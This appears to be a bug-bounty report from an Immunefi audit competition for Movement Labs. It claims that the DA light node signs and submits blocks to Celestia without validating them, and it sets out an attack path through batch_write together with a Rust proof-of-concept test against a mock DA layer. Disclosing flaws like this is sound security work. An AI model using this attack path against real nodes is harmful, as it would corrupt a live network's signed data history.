# #43229 \[BC-High] There is a bug can allows malicious data to enter the DA layer and be signed by a legitimate node

**Submitted on Apr 3rd 2025 at 21:35:45 UTC by @XDZIBECX for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43229
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

## Brief/Intro

There is a vulnerability in fn tick\_publish\_blobs because this function is ultimately serializes and signs Block objects and this happen using `Block::try_into()` without any validation on the block’s content, or structure, or logical consistency, and the `try_into()` implementation simply is uses `bcs::to_bytes(&block)?`, mean it's blindly encodes any block — and this can include a malformed, fake, or malicious ones — into a byte array, which is then signed and submitted to the DA layer as an authentic, trusted blob, this is a problem because this behavior is not safe and is breaks the assumption that all published blocks are verified and canonical, because without verifying that the block.id matches its contents, that the parent block exists, that the timestamp is valid, and that transactions are bounded, unique, and properly ordered, the system effectively can allows arbitrary data to be signed and committed to history. This is not safe: it creates a trust-breaking path where a fake blocks can be submitted as real, see vulnerability details to see where this problem came from .

## Vulnerability Details

here on the tick\_publish\_blobs() – there is no validation before submission --> <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/da/movement/protocol/light-node/src/sequencer.rs#L235> :

```
self.submit_blocks(blocks).await?;
```

This line blindly forwards a list of blocks to submit\_blocks() and this without performing any structural or semantic validation on the blocks and is show that there is not check on :\
block.id matching its contents\
block.parent pointing to a known parent\
transactions being unique, bounded, or properly ordered

* here on `submit_blocks()` this is the vulnerable block conversion --><https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/da/movement/protocol/light-node/src/sequencer.rs#L167>

```
let data: InnerSignedBlobV1Data<C> = block.try_into()?;  <--NO VALIDATION
```

This line is calls .try\_into() on the Block, and is assuming it is well-formed but the implementation of .try\_into() does not perform validation — it only serializes

* and here <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/da/movement/protocol/util/src/blob/ir/data.rs#L79> the try\_into() implementation also does not verify that if the block.id matches a hash of its content or if the parent block is valid or known or if the transaction list is not malformed or oversized

```
fn try_from(block: block::Block) -> Result<Self, Self::Error> {
			let blob = bcs::to_bytes(&block)?;
			Ok(Self::now(blob))
		}
	}
```

* and here <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/da/movement/protocol/light-node/src/sequencer.rs#L169\\>
  the signed blob is submitted to the Celestia DA layer and It's becomes part of the canonical data availability history even though it was never validated this is a risk and need to bee fixed it's must add a validate\_block() function before calling .try\_into() or .try\_to\_sign()

attack path :

* This Bug is can Allows Malicious or Malformed Data to Enter the DA Layer and Be Signed by a Legitimate Node so let's say an attacker Sends a Malicious Input via batch\_write() as :

```rust
async fn batch_write(
	&self,
	request: tonic::Request<grpc::BatchWriteRequest>,
) -> std::result::Result<tonic::Response<grpc::BatchWriteResponse>, tonic::Status>

```

```rust
let transaction: Transaction = serde_json::from_slice(&blob.data)
	.map_err(|e| tonic::Status::internal(e.to_string()))?;

match &self.prevalidator {
	Some(prevalidator) => {
		// validate transaction
		match prevalidator.prevalidate(transaction).await {
			Ok(prevalidated) => transactions.push(prevalidated.into_inner()),
			Err(_) => { /* handle error or discard */ }
		}
	}
	None => transactions.push(transaction),  // <-- There us NO VALIDATION HERE
}
```

so If the LightNode is not configured with a prevalidator, the node is blindly accepts any transaction blob and pushes it into the internal transaction pool (memseq).

* the transactions Enter memseq, are automatically turned Into a Block because Inside tick\_build\_blocks() here :

```
let block = memseq.wait_for_next_block().await?;
```

memseq is responsible for Receiving transactions and Aggregating them into a block and Returning that Block to the LightNode runtime But there's no validation here. and It assumes transactions are clean and that blocks are well-formed which may not be true for attacker-controlled input.

* And the Block Is Submitted Without any Validation or Verification because Inside tick\_publish\_blobs() on this line :

```
self.submit_blocks(blocks).await?;
```

and then inside submit\_blocks() on this line :

```
let data: InnerSignedBlobV1Data<C> = block.try_into()?;  <----- HERE IS BLIND SERIALIZATION
let blob = data.try_to_sign(&self.pass_through.signer).await?;  <-----  AND HERE  SIGNED LEGITIMATELY
self.pass_through.da.submit_blob(blob.into()).await?;  <-----  AND HERE SUBMITTED TO CELESTIA
```

The block.try\_into() function is implemented as:

```
fn try_from(block: block::Block) -> Result<Self, Self::Error> {
	let blob = bcs::to_bytes(&block)?;  // THERE IS NO CHECKS
	Ok(Self::now(blob))
}
```

So, whatever gets passed into block, whether it's A block with a fake or unknown parent or Invalid or unordered transactions or a block with the wrong block.id (not matching its contents) …it still gets serialized, signed, and submitted to Celestia, indistinguishable from a real block.

* an attacker can exploit this by sends a validly formatted but are logically incorrect blob to batch\_write() and block Contains a transaction that manipulates block internals ( includes malicious tx data, or weird timestamps) so the node accepts the blob because prevalidator == None, then the blob enters memseq, and is added to the next Block\
  That block is :\
  \- Contains an invalid parent (e.g., 0xdead...)\
  \- An inconsistent id (doesn't match the hash of the contents)\
  -10,000 spam transactions (DoS)\
  so Node serializes it via .try\_into() without checking anything and then Signs it and submits to Celestia as result a fake block becomes permanent history, and signed by a real node

## Impact Details

This bug is can allows malicious or malformed data to enter the DA layer and be signed by a legitimate node, and this is making it indistinguishable from valid, well-formed blocks. While no direct user funds are at risk from this bug alone,

The vulnerability is in core layer 1 protocol code and It breaks data integrity and DA trust assumptions But there is no fund at risk

## References

## Proof of Concept

## Proof of Concept

```rust
 
#[tokio::test]
async fn test_invalid_block_is_signed_and_submitted_to_da() {
    use movement_da_util::blob::ir::data::InnerSignedBlobV1Data;
    use movement_da_light_node_proto::{BatchWriteRequest, Blob};
    use movement_types::block::Block;
    use movement_da_light_node_sequencer::LightNode;
    use movement_signer::cryptography::secp256k1::Secp256k1;
    use movement_signer_loader::LoadedSigner;
    use memseq::Transaction;
    use tonic::Request;
    use std::sync::Arc;

    // STEP 1 — Create LightNode instance WITHOUT a prevalidator (crucial)
    let config = Config::load_without_whitelist(); // Custom test config: no prevalidator
    let light_node: LightNode<LoadedSigner<Secp256k1>, Secp256k1, _, _> =
        LightNode::try_from_config(config).await.unwrap();

    // STEP 2 — Craft an intentionally malformed transaction (wrong parent or bad ID)
    let malformed_tx = Transaction {
        id: "FAKE_ID_123".to_string(),
        payload: b"{\"bad\": \"data\"}".to_vec(), // fake payload structure
        parent_id: "0xdeadbeef".to_string(),     // invalid or non-existent parent
        timestamp: 9999999999999,               // unreasonable timestamp (e.g., far in future)
        ..Default::default()
    };
    let malformed_blob_data = serde_json::to_vec(&malformed_tx).unwrap();

    // STEP 3 — Submit the blob via batch_write gRPC method
    let blob = Blob {
        data: malformed_blob_data,
        ..Default::default()
    };
    let batch_request = Request::new(BatchWriteRequest { blobs: vec![blob] });
    light_node.batch_write(batch_request).await.unwrap();

    // STEP 4 — Let LightNode build the block with the malformed tx
    let (sender, mut receiver) = tokio::sync::mpsc::channel(8);
    tokio::spawn({
        let node = light_node.clone();
        async move {
            node.tick_build_blocks(sender).await.unwrap();
        }
    });

    // STEP 5 — Read the block from internal buffer
    let mut blocks = light_node.read_blocks(&mut receiver).await.unwrap();
    assert!(!blocks.is_empty(), "Block should be produced from unvalidated tx");

    let block = blocks.pop().unwrap();

    // STEP 6 — Serialize and sign the block
    let signed_data: InnerSignedBlobV1Data<_> = block.clone().try_into().unwrap();
    let signed_blob = signed_data.try_to_sign(&light_node.pass_through.signer).await.unwrap();

    // STEP 7 — Submit the signed blob to mock DA layer (no rejection)
    let result = light_node.pass_through.da.submit_blob(signed_blob.into()).await;

    assert!(result.is_ok(), "Malicious block was accepted and submitted");

    // STEP 8 — (Optional) Check the blob exists in mock DA store
    let maybe_stored = light_node.pass_through.da.get_last_submitted_blob().await;
    assert!(maybe_stored.is_some(), "Blob was stored in DA layer");

    println!("  Malicious block was blindly signed and submitted to DA.");
}


```
